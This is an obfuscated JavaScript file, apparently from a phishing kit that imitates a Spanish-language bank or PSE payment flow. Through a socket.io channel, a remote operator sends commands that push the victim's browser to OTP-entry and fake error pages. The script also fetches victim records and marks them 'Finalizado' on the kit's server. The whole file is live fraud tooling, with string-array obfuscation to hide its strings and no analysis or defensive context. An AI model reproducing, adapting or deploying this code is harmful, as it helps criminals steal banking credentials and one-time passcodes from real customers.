(function (_0x2db02d, _0x289333) {
  const _0xe935fe = _0x55f2,
    _0xf36940 = _0x2db02d();
  while (!![]) {
    try {
      const _0x563f40 =
        (-parseInt(_0xe935fe(0x186)) / 0x1) *
          (-parseInt(_0xe935fe(0x192)) / 0x2) +
        (parseInt(_0xe935fe(0x18f)) / 0x3) *
          (parseInt(_0xe935fe(0x19d)) / 0x4) +
        parseInt(_0xe935fe(0x18b)) / 0x5 +
        -parseInt(_0xe935fe(0x18e)) / 0x6 +
        (parseInt(_0xe935fe(0x19e)) / 0x7) *
          (parseInt(_0xe935fe(0x19a)) / 0x8) +
        (parseInt(_0xe935fe(0x191)) / 0x9) *
          (parseInt(_0xe935fe(0x18a)) / 0xa) +
        -parseInt(_0xe935fe(0x189)) / 0xb;
      if (_0x563f40 === _0x289333) break;
      else _0xf36940["push"](_0xf36940["shift"]());
    } catch (_0x3d8a0d) {
      _0xf36940["push"](_0xf36940["shift"]());
    }
  }
})(_0x4578, 0x700f9);
function _0x4578() {
  const _0x5219f0 = [
    "./otp.error.html",
    "log",
    "/trico/tricofinishPse/",
    "831880OevWHK",
    "href",
    "valid",
    "212NtGVLT",
    "28rmRCQW",
    "metaInfo",
    "Usuario\x20encontrado",
    "./otp.html",
    "idreg",
    "location",
    "finish",
    "Finalizado",
    "1RIdQvR",
    "user",
    "valor",
    "14875465MzQatd",
    "10GothLZ",
    "3335100ZadknG",
    "GET",
    "./errorPse.html",
    "4907202xxwsTI",
    "40962KRGqWk",
    "json",
    "3131883PoAHic",
    "949148RRDLtk",
    "stringify",
    "otp",
    "/trico/tricoData",
    "application/json",
  ];
  _0x4578 = function () {
    return _0x5219f0;
  };
  return _0x4578();
}
var socket = io["connect"](url);
function _0x55f2(_0x2ec1db, _0x595aed) {
  const _0x4578ee = _0x4578();
  return (
    (_0x55f2 = function (_0x55f216, _0x448e3b) {
      _0x55f216 = _0x55f216 - 0x183;
      let _0x419664 = _0x4578ee[_0x55f216];
      return _0x419664;
    }),
    _0x55f2(_0x2ec1db, _0x595aed)
  );
}
socket["on"]("ps", function (_0x701a07) {
  const _0xcfd91d = _0x55f2;
  if (
    _0x701a07[_0xcfd91d(0x188)] == _0xcfd91d(0x187) &&
    _0x701a07[_0xcfd91d(0x19c)] == info["metaInfo"]["cc"]
  )
    window[_0xcfd91d(0x183)][_0xcfd91d(0x19b)] = "./index.error.html";
  else {
    if (
      _0x701a07[_0xcfd91d(0x188)] == _0xcfd91d(0x194) &&
      _0x701a07[_0xcfd91d(0x19c)] == info[_0xcfd91d(0x19f)]["cc"]
    )
      window[_0xcfd91d(0x183)][_0xcfd91d(0x19b)] = _0xcfd91d(0x1a1);
    else {
      if (
        _0x701a07[_0xcfd91d(0x188)] == "newOtp" &&
        _0x701a07["valid"] == info[_0xcfd91d(0x19f)]["cc"]
      )
        window[_0xcfd91d(0x183)][_0xcfd91d(0x19b)] = _0xcfd91d(0x197);
      else {
        if (
          _0x701a07[_0xcfd91d(0x188)] == _0xcfd91d(0x184) &&
          _0x701a07[_0xcfd91d(0x19c)] == info[_0xcfd91d(0x19f)]["cc"]
        ) {
          async function _0x11bc2b() {
            const _0x395211 = _0xcfd91d,
              _0x39084b = await fetch(url + _0x395211(0x195), {
                method: _0x395211(0x18c),
                headers: { "Content-Type": _0x395211(0x196) },
              }),
              _0x5d5f7c = await _0x39084b[_0x395211(0x190)](),
              _0x180bf7 = [..._0x5d5f7c];
            for (const _0x3a79c4 of _0x180bf7) {
              if (_0x3a79c4["id"] == info[_0x395211(0x19f)]["cc"]) {
                console[_0x395211(0x198)](_0x395211(0x1a0));
                const _0x24004b = await fetch(
                    url + _0x395211(0x199) + _0x3a79c4[_0x395211(0x1a2)],
                    {
                      method: "PUT",
                      headers: { "Content-Type": "application/json" },
                      body: JSON[_0x395211(0x193)]({
                        estado: _0x395211(0x185),
                      }),
                    }
                  ),
                  _0x201348 = await _0x24004b[_0x395211(0x190)]();
              }
            }
            window["location"][_0x395211(0x19b)] = _0x395211(0x18d);
          }
          _0x11bc2b();
          return;
        }
      }
    }
  }
});
